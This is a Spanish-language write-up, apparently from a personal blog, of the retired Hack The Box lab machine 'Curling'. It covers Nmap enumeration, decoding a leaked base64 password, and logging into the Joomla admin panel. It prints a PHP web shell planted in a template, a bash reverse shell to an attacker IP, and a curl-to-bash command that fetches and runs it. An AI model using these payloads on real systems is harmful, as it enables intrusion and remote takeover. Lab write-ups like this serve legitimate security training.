---
layout: post
title:  "Maquina  Retirada Curling de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CURLING
tags: HTB, Joomla, CURL, Web Hacking, Maquinas Retiradas, Writeup
---

# Curling ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.150       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
$" nmap -sC -sV -p -oN target 10.10.10.150  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Procedemos a hacer un pequeño Fuzzing con nmap y el script `http-enum`
```bash
# nmap --script http-enum -p80 10.10.10.150 -oN Webscan
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 17:25 CEST
Nmap scan report for 10.10.10.150
Host is up (0.041s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /administrator/manifests/files/joomla.xml: Joomla version 3.8.8
|   /language/en-GB/en-GB.xml: Joomla version 3.8.8
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```
Procedemos a hecharle un vistazo a la pagina web
_foto_
Vemos varios comentarios y enumeramos un posible usuario llamado `"Floris"`

Hacemos #Ctrl+U para inspeccionar el codigo fuente

Nos encontramos al final del codigo fuente de la pagina principal un comentario con un `secret.txt`

Procedemos con: `"http://10.10.10.150/secret.txt"`

Encontramos un hash: `Q3VybGluZzIwMTgh` que parece estar codificado en `base64`

Hacemos un tratamiento de la posible pass encontrada:
```bash
# echo "Q3VybGluZzIwMTgh" | base64 -d       
Curling2018!
``` 

Seguimos comprobando las rutas que nos a enumerado el script de nmap: `"/administrator/"`
Encontramos el Panel Login.
Tenemos:
```bash
User: Floris
Pass: Curling2018!
```
Nos conseguimos loguear correctamente como el user Floris
Una vez dentro nos dirigimos a `TEMPLATES`, elegimos el tema `Beez3` y procedemos a crear un nuevo archivo.
_foto_

El archivo que vamos a crear va a ser una archivo malicioso `.php`tal que podamos ejecutar comandos a a nivel web para posteriormente lanzarnos una shell
Archivito del Joomla: Nombre: `pros.php`
```php
<?php
    system($_REQUEST['cmd']);
?>
```
Ahora a nivel web vamos a intentar apuntar a nuestro archivo template creado nuevo: `/templates/beez3/pros.php`
Vemos que nos responde y se esta interpretando, procedemos a ejecutar comandos de la siguiente forma:
_foto_
```bash
  "http://10.10.10.150/templates/beez3/pros.php?cmd=whoami"
www-data
``` 
Probamos con las revershell de siempre y vemos que no conseguimos acceso a la maquina.
La Alternativa esta en el uso de CURL para hacer una peticion a un servidor que nos montemos con python3, compartiendo un archivo shell.sh para apunte a nuestro servidor con una Revese_shell:
Archivo `Shell.sh`
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.5/443
```
Teniendo el servidor `python3 -m http.server 80` montado alojando el recurso `Shell.sh`
Procedemos a hacer la Peticion Web:
```bash
  "http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.16.132/Shell.sh"
```
Como output: Vemos que se nos lee el codigo tipo:
`#!/bin/bash bash -i >& /dev/tcp/10.10.16.132/443 0>&1 `

Nos preparamos y nos ponemos a la escucha con `nc -vnlp 443` para recibir la shell.
Ahora paso clave: Pipearlo con `BASH`
Para lograr que se ejecute ahora el codigo:
```bash
  "http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.16.132/Shell.sh|bash"
```
Y de este modo conseguimos nuestra consola como `www-data`
